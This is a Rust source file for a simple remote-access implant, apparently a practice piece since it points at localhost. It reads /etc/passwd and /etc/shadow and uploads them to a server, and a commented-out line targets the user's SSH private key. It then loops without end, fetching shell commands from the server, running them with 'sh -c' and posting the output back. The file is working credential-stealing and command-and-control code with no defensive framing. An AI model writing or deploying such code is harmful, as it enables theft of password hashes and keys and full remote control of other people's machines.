use std::env;
use std::str;
use std::fs;
use std::io::Read;
use std::process::Command;
use reqwest::header::{HeaderMap, HeaderValue, CONTENT_ENCODING, CONTENT_TYPE, USER_AGENT, ACCEPT};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let url_base = "http://localhost:8000";
    let hostname = "testing";
    upload(url_base, "passwd", "/etc/passwd", hostname);
    upload(url_base, "shadow", "/etc/shadow", hostname);
//    upload(url_base, "ssh", "~/.ssh/id_rsa", hostname);
    let command_url = format!("{}/command", url_base);
    loop {
        command(&command_url, hostname);
    }
    Ok(())
}
fn command(url: &str, hostname: &str) -> Result<(), Box<dyn std::error::Error>> {
    let mut res = reqwest::blocking::get(url)?;
    let mut body = String::new();
    res.read_to_string(&mut body)?;
    let mut output = Command::new("sh")
        .arg("-c")
        .arg(body)
        .output()
        .expect("failed to execute process");
    let out = String::from_utf8_lossy(&output.stdout);
    println!("{}", out);
    post(url, out.to_string());
    
    Ok(())
}
fn get(url: &str) -> Result<(), Box<dyn std::error::Error>> {
    let mut res = reqwest::blocking::get(url)?;
    let mut body = String::new();
    res.read_to_string(&mut body)?;
    println!("{}", body);
    Ok(())
}

fn getFiles() {
  //  shadow();
  //  passwd();
}
fn post(url: &str, data: String) -> Result<(), Box<dyn std::error::Error>> {
    let client = reqwest::blocking::Client::new();
    let body = data;
    let res = client.post(url)
        .body(body)
        .headers(construct_headers())
        .send()?;
    Ok(())
}
fn upload(url_base: &str, file_name: &str, file_location: &str, hostname: &str) -> Result<(), Box<dyn std::error::Error>> {
    let file = fs::read_to_string(file_location)?;
    let url = format!("{}/post/{}/{} ", url_base, hostname, file_name);
    println!("Url is {}", url);
    let client = reqwest::blocking::Client::new();
    let res = client.post(url)
        .body(file)
        .headers(construct_headers())
        .send()?;

    Ok(())
}
fn construct_headers() -> HeaderMap {
    let mut headers = HeaderMap::new();
    headers.insert(CONTENT_ENCODING, HeaderValue::from_static("utf-8"));
    headers.insert(USER_AGENT, HeaderValue::from_static("Reqwest"));
    headers.insert(CONTENT_TYPE, HeaderValue::from_static("text/plain"));
    headers.insert(ACCEPT, HeaderValue::from_static("*/*"));
    headers
}
